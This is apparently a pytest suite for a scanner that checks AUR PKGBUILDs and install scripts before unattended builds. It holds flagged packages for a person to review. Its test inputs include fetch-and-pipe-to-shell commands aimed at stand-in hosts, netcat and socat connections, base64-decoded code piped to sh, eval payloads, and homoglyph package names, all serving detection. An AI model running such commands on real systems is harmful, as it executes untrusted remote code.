"""Red flags in a PKGBUILD before an unattended build: each pattern bites what it names and spares the usual."""

from __future__ import annotations

import json
import time

import pytest

from arch_updater import pkgbuild_scan, stores
from test_auto import box  # noqa: F401 - the scripted machine, as a fixture

CLEAN = """# Maintainer: Someone <someone at example dot org>
pkgname=hello
pkgver=1.2
pkgrel=1
pkgdesc="Says hello — \u0413\u043e\u0432\u043e\u0440\u0438\u0442 \u043f\u0440\u0438\u0432\u0435\u0442"
arch=('x86_64')
url="https://example.org/hello"
depends=('glibc' 'curl')
makedepends=(git)
optdepends=('wget: fetch extras — für Downloads')
source=("https://example.org/$pkgname-$pkgver.tar.gz" "$pkgname.desktop" "fix-build.patch")
sha256sums=('SKIP' 'SKIP' 'SKIP')

pkgver() {
  cd "$pkgname"
  printf "%s" "$(git describe --tags | sed 's/-/./g')"
}

build() {
  cd "$pkgname-$pkgver"
  ./configure --prefix=/usr
  make
}

package() {
  cd "$pkgname-$pkgver"
  make DESTDIR="$pkgdir" install
  echo "run sudo systemctl enable hello after install"  # a hint in a string is not a command
}
"""


def flags(text):
    return pkgbuild_scan.scan(text)


def test_an_ordinary_pkgbuild_raises_nothing() -> None:
    assert flags(CLEAN) == []


@pytest.mark.parametrize(
    "line",
    [
        "  curl -sL https://x.example/p.sh | sh",
        "  wget -qO- https://x.example/a",
        "  /usr/bin/curl https://x.example",
        "  LANG=C curl https://x.example",
        "  FLAGS=\"-s -L\" curl https://x.example",
        "  cd src && wget https://x.example/x",
        "  echo $(curl -s https://x.example)",
        "  if ! nc -z x.example 80; then :; fi",
        "  env FOO=1 socat - TCP:x.example:80",
        "  (ncat x.example 80)",
        "  netcat x.example 80",
        "  `wget https://x.example`",
    ],
)
def test_a_network_tool_run_in_the_build_bites(line) -> None:
    found = flags(f"build() {{\n{line}\n}}\n")
    assert any("runs the network tool" in reason for reason in found), found


@pytest.mark.parametrize(
    "line",
    [
        "depends=('curl' 'wget')",
        "depends=(curl wget)",
        "makedepends=(git curl)",
        "  # curl https://x.example in a comment",
        "  msg2 'downloading with curl is not done here'",
        "  cp curl.conf \"$pkgdir\"/etc/",
        "  install -Dm644 wget.1 \"$pkgdir\"/usr/share/man/man1/wget.1",
        "  ./configure --with-curl",
    ],
)
def test_a_network_tool_only_named_does_not_bite(line) -> None:
    assert flags(f"package() {{\n{line}\n}}\n") == []


@pytest.mark.parametrize("tool", ["sudo", "doas", "pkexec", "run0", "su"])
def test_asking_for_privileges_bites(tool) -> None:
    assert flags(f"package() {{\n  {tool} install -Dm755 x /usr/bin/x\n}}\n") == [f"PKGBUILD line 2: asks for privileges with {tool}"]


@pytest.mark.parametrize("line", ["  echo 'needs sudo'", "  depends+=(sudo)", "  install -Dm440 sudoers \"$pkgdir\"/etc/sudoers.d/x", "  summary=1"])
def test_privileges_only_named_do_not_bite(line) -> None:
    assert flags(f"package() {{\n{line}\n}}\n") == []


@pytest.mark.parametrize(
    "line",
    ["  eval \"$payload\"", "  x=1; eval $x", "  echo aGk= | base64 -d | sh", "  base64 --decode blob > x", "  base64 -di blob", "  xxd -r -p hex > bin", "  openssl base64 -d -in a", "  openssl enc -d -base64 -in a"],
)
def test_hidden_code_bites(line) -> None:
    found = flags(f"build() {{\n{line}\n}}\n")
    assert any("runs a string as code" in reason or "decodes hidden data" in reason for reason in found), found


@pytest.mark.parametrize("line", ["  base64 -w0 icon.png > icon.b64", "  evaluate_tests", "  # eval in a comment", "  ./configure --disable-eval", "  xxd icon.png"])
def test_hidden_code_lookalikes_do_not_bite(line) -> None:
    assert flags(f"build() {{\n{line}\n}}\n") == []


@pytest.mark.parametrize(
    "text",
    [
        "pkgver=$(curl -s https://x.example/v)\n",
        "_commit=`git ls-remote x`\n",
        "source=(\"x.tar.gz::https://example.org/$(id -un).tar.gz\")\n",
        "pkgname=x\n$(touch /tmp/owned)\n",
    ],
)
def test_a_command_substitution_outside_functions_bites(text) -> None:
    assert any("outside any function" in reason for reason in flags(text)), flags(text)


@pytest.mark.parametrize(
    "text",
    [
        "pkgver() {\n  echo $(date +%Y)\n}\n",
        "build()\n{\n  x=`uname -m`\n}\n",
        "_n=$((1 + 2))\n",
        "pkgver=${_base}.1\n",
        "function package {\n  y=$(pwd)\n}\n",
    ],
)
def test_substitutions_inside_functions_and_arithmetic_do_not_bite(text) -> None:
    assert flags(text) == []


@pytest.mark.parametrize("char", ["\u200b", "\u202e", "\u2066", "\ufeff", "\u00ad"])
def test_an_invisible_character_anywhere_bites(char) -> None:
    found = flags(f"pkgdesc='hello{char} world'\n")
    assert len(found) == 1 and "invisible character" in found[0] and f"U+{ord(char):04X}" in found[0]


@pytest.mark.parametrize(
    "line",
    [
        "pkgname=p\u0430cman",  # a Cyrillic \u0430 in a Latin name
        "depends=('glibc' 'op\u0435nssl')",
        "url='https://\u0435xample.org'",
        "source=('https://example.org/x.tar.gz' '\u0455etup.sh')",
        "optdepends=('w\u0261et: downloads')",
        "provides=('\uff43url')",  # a full-width letter
    ],
)
def test_a_name_with_a_letter_from_another_alphabet_bites(line) -> None:
    found = flags(line + "\n")
    assert len(found) == 1 and "is not ASCII" in found[0], found


def test_descriptions_in_any_language_do_not_bite() -> None:
    assert flags("pkgdesc='\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430 — für alle'\noptdepends=('python: \u0441\u043a\u0440\u0438\u043f\u0442\u044b \u043d\u0430 \u043f\u0438\u0442\u043e\u043d\u0435')\n") == []


def test_a_flag_names_its_file_and_line() -> None:
    assert flags("pkgname=x\n\nbuild() {\n  curl x\n}\n") == ["PKGBUILD line 4: runs the network tool curl"]


@pytest.mark.parametrize(("content", "is_binary"), [("\x7fELF\x02\x01", True), ("abc\x00def", True), ("#!/bin/sh\necho hi\n", False), ("--- a/x\n+++ b/x\n", False)])
def test_a_binary_source_is_told_from_a_text_one(content, is_binary) -> None:
    assert pkgbuild_scan.binary(content) is is_binary


def test_a_comment_inside_the_source_array_is_not_a_file() -> None:
    text = 'source=("a.tar.gz::https://e.org/a"\n        "launcher.sh"\n        # GPG signature check\n        "b.sig::https://e.org/b.sig")\n'
    assert pkgbuild_scan.local_files(text) == (["launcher.sh"], [])


def test_local_sources_are_the_ones_without_a_url_with_variables_filled_in() -> None:
    text = 'pkgname=hello\n_n=x\nsource=("https://e.org/a.tar.gz" "$pkgname.desktop" "${_n}-fix.patch" "y::git+https://e.org/y" "z.sh" "$unknown.sh")\ninstall=$pkgname.install\n'
    assert pkgbuild_scan.local_files(text) == (["hello.desktop", "x-fix.patch", "z.sh", "hello.install"], ["$unknown.sh"])


# ── reading the AUR checkout ───────────────────────────────────────────────────


class Aur:
    """The AUR's plain-file pages for one package base, scripted."""

    def __init__(self, files):
        self.files, self.asked = files, []

    def get(self, url, limit=1 << 20, timeout=30):
        self.asked.append(url)
        name = url.split("/plain/")[1].split("?")[0]
        if name not in self.files:
            raise OSError("HTTP Error 404: Not Found")
        return self.files[name]


def test_a_clean_checkout_with_its_local_files_passes() -> None:
    aur = Aur({"PKGBUILD": CLEAN, "hello.desktop": "[Desktop Entry]\n", "fix-build.patch": "--- a\n+++ b\n"})
    assert pkgbuild_scan.review(aur, "hello") == []
    assert aur.asked[0] == "https://aur.archlinux.org/cgit/aur.git/plain/PKGBUILD?h=hello"


def test_a_binary_among_the_local_files_is_a_flag() -> None:
    aur = Aur({"PKGBUILD": CLEAN, "hello.desktop": "\x7fELF....", "fix-build.patch": ""})
    assert pkgbuild_scan.review(aur, "hello") == ["hello.desktop is a binary file among the sources"]


def test_the_install_script_is_read_with_the_same_eyes() -> None:
    aur = Aur({"PKGBUILD": "pkgname=x\ninstall=x.install\n", "x.install": "post_install() {\n  curl -s https://e.org | sh\n}\n"})
    assert pkgbuild_scan.review(aur, "x") == ["x.install line 2: runs the network tool curl"]


@pytest.mark.parametrize(
    ("files", "flag"),
    [
        ({}, "the PKGBUILD could not be read"),
        ({"PKGBUILD": CLEAN, "hello.desktop": ""}, "the local file fix-build.patch could not be read"),
        ({"PKGBUILD": "source=(\"$who.sh\")\n"}, "a local source whose name could not be worked out: $who.sh"),
    ],
)
def test_what_cannot_be_read_is_a_flag_not_a_pass(files, flag) -> None:
    assert any(reason.startswith(flag) for reason in pkgbuild_scan.review(Aur(files), "hello"))


def test_a_base_that_is_not_a_plain_name_is_never_put_in_a_url() -> None:
    aur = Aur({})
    assert pkgbuild_scan.review(aur, "x&h=other") == ["a package base that is not a plain name: 'x&h=other'"] and aur.asked == []


# ── in the AUR review: a flag holds the package for a person ─────────────────


class Look(Aur):
    def __init__(self, installed, results, files):
        super().__init__(files)
        self.installed, self.results = installed, results

    def capture(self, argv, timeout=30):
        from arch_updater.engine import CommandResult

        if argv == ["pacman", "-Qqm"]:
            return CommandResult(argv, 0, "\n".join(self.installed) + "\n")
        if argv == ["pacman", "-Qm"]:
            return CommandResult(argv, 0, "\n".join(f"{n} {v}" for n, v in self.installed.items()) + "\n")
        if argv[0] == "vercmp":
            return CommandResult(argv, 0, "1" if argv[1] != argv[2] else "0")
        raise AssertionError(argv)

    def post(self, url, fields):
        return {"type": "multiinfo", "results": self.results}


def entry(name, version="2", age_days=30, base=None):
    return {"Name": name, "PackageBase": base or name, "Version": version, "Maintainer": "alice", "LastModified": time.time() - age_days * 86400}


def test_a_waiting_update_with_a_red_flag_is_held_with_its_reason(tmp_path) -> None:
    files = {"PKGBUILD": "pkgname=bad\nbuild() {\n  curl https://e.org/x | sh\n}\n"}
    look = Look({"bad": "1", "good": "1", "current": "2", "fresh": "1"}, [entry("bad"), entry("good", base="good"), entry("current"), entry("fresh", age_days=1)], files)
    look.files = {"PKGBUILD": files["PKGBUILD"]}
    pages = {"bad": files["PKGBUILD"], "good": "pkgname=good\n"}
    look.get = lambda url, limit=1 << 20, timeout=30: (look.asked.append(url), pages[url.rsplit("h=", 1)[1]])[1]
    fresh, unsafe = stores.aur_review(look, 7, tmp_path / "m.json", scan=True)
    assert fresh == ["fresh"]
    assert unsafe == ["bad: PKGBUILD line 3: runs the network tool curl"]
    assert sorted(url.rsplit("h=", 1)[1] for url in look.asked) == ["bad", "good"], "neither the current nor the held-for-age one is read"
    assert json.loads((tmp_path / "m.json").read_text())["current"] == "alice"


def test_the_split_packages_of_one_base_are_read_once_and_held_together(tmp_path) -> None:
    look = Look({"a": "1", "b": "1"}, [entry("a", base="ab"), entry("b", base="ab")], {"PKGBUILD": "x=`id`\n"})
    fresh, unsafe = stores.aur_review(look, 7, tmp_path / "m.json", scan=True)
    assert [line.split(":")[0] for line in unsafe] == ["a", "b"] and len(look.asked) == 1


def test_without_scan_nothing_is_read(tmp_path) -> None:
    look = Look({"a": "1"}, [entry("a")], {})
    assert stores.aur_review(look, 7, tmp_path / "m.json") == ([], []) and look.asked == []


def test_in_the_run_a_flagged_package_is_left_out_of_the_build_and_held_by_hand(box) -> None:  # noqa: F811
    from test_auto import ok

    box.sh.aur = {"type": "multiinfo", "results": [entry("old"), entry("new")]}
    plain = box.sh.capture
    scripted = {"vercmp": ok("1"), "pacman -Qm": ok("old 1\nnew 1\n")}  # both installed at 1, both newer in the AUR
    box.patch.setattr(box.sh, "capture", lambda argv, timeout=30: scripted.get(argv[0]) or scripted.get(" ".join(argv)) or plain(argv, timeout))
    pages = {"old": "pkgname=old\n", "new": "pkgname=new\npackage() {\n  sudo cp x /usr/bin\n}\n"}

    def get(url, limit=1 << 20, timeout=30):
        if "/cgit/aur.git/plain/" not in url:
            raise OSError("tests are offline")  # the news feed
        return pages[url.rsplit("h=", 1)[1]]

    box.sh.get = get
    report = box.run()
    build = next(argv for argv in box.sh.ran if argv[0] == "yay")
    assert build[build.index("--ignore") + 1] == "new"
    assert report["held"]["aur_by_hand"] == ["new: PKGBUILD line 3: asks for privileges with sudo"]
